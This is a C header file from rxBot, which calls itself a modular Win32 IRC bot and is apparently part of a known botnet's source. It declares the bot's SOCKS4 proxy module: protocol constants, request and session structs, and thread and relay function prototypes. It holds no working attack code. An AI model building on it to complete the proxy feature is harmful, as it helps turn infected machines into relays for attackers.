/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#ifndef NO_SOCK4SERV
#define SOCKS4_CONNECT 1
#define SOCKS4_BIND 2
#define SOCKS4_GRANT 90
#define SOCKS4_REJECT 91
#define SOCKS4_REJECT_IDENTD 92
#define SOCKS4_REJECT_USERID 93

// socks4 daemon structure.
typedef struct SOCKS4HEADER 
{
	u_char vn;
	u_char cd;
	unsigned short destport;
	unsigned long destaddr;
	char userid[1024];

} SOCKS4HEADER;

typedef struct SOCKS4 
{
	SOCKET sock;
	char chan[MAXCHANLEN];
	char userid[16];
	unsigned short port;
	int threadnum;
	int cthreadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;
	BOOL cgotinfo;

} SOCKS4;

 
DWORD WINAPI Socks4Thread(LPVOID param);
DWORD WINAPI Socks4ClientThread(LPVOID param);
void TransferLoop(SOCKET tsock, SOCKET csock);
#endif
